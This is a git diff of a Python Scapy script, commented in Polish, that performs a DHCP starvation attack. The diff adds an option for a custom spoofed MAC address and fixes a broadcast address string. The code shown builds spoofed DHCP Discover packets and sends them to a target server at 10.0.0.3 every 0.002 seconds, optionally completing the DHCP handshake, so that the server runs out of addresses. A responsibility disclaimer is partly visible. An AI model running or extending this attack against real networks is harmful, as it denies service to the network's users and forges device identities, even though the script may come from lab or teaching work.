@@ -6,7 +6,7 @@ from time import sleep, time
 from threading import Thread
 
 class DHCPStarvation:
-    def __init__(self, singleSpoofedMAC=False, finishDORA=False, sleepTimer=0.2, targetDHCPServerIP="255.255.255.255", loggingEnabled=False):
+    def __init__(self, singleSpoofedMAC=False, customMAC="", finishDORA=False, sleepTimer=0.2, targetDHCPServerIP="255.255.255.255", loggingEnabled=False):
         self.macs=[]
         self.singlemac=""
 
@@ -15,6 +15,8 @@ class DHCPStarvation:
         self.finishDORA=finishDORA
         self.targetDHCPServerIP=targetDHCPServerIP
         self.loggingEnabled=loggingEnabled
+
+        if singleSpoofedMAC and len(customMAC) > 0: self.singlemac = customMAC
 
     # Funkcja drukująca komunikaty na stdout oraz zapisująca do pliku log.txt
     def log(self, message):
@@ -110,7 +112,7 @@ class DHCPStarvation:
             self.macs.append(src_mac)
 
         # Definicja pakietu sieciowego do wysłania
-        pkt = Ether(src=src_mac, dst="ff:ff:Ff:ff:ff:Ff")
+        pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:Ff")
         pkt /= IP(src="0.0.0.0", dst=self.targetDHCPServerIP)
         pkt /= UDP(sport=68, dport=67)
         pkt /= BOOTP(chaddr=mac2str(src_mac))
@@ -124,12 +126,14 @@ class DHCPStarvation:
 if __name__ == "__main__":
     # Opis poniższych opcji:
     # singleSpoofedMAC      - Czy losować za każdym zapytaniem nowy adres MAC
+    # customMAC             - Działa tylko przy singleSpoofedMAC = True. Pozwala na ustalenie własnego adresu MAC do przeprowadzenia ataku
     # finishDORA            - Czy po otrzymaniu DHCP Offer odpowiadać za pomocą DHCP Request
     # sleepTimer            - Odstęp czasu w sekundach między każdym wysłanym pakietem DHCP Discover
     # targetDHCPServerIP    - Adres IP docelowego serwera DHCP. Domyślna wartość 255.255.255.255 to adres broadcast
     # loggingEnabled        - Czy zapisywać każdy z komunikatów do pliku log.txt?
 
     singleSpoofedMAC    = False
+    customMAC           = ""
     finishDORA          = True
     sleepTimer          = 0.002
     targetDHCPServerIP  = "10.0.0.3"
@@ -153,7 +157,7 @@ Jeżeli rozumiesz powyższą treść oraz przyjmujesz odpowiedzialność
 """
 )
 
-    loop = DHCPStarvation(singleSpoofedMAC ,finishDORA, sleepTimer, targetDHCPServerIP, loggingEnabled)
+    loop = DHCPStarvation(singleSpoofedMAC, customMAC, finishDORA, sleepTimer, targetDHCPServerIP, loggingEnabled)
 
     while True:
         choice=input("> ")
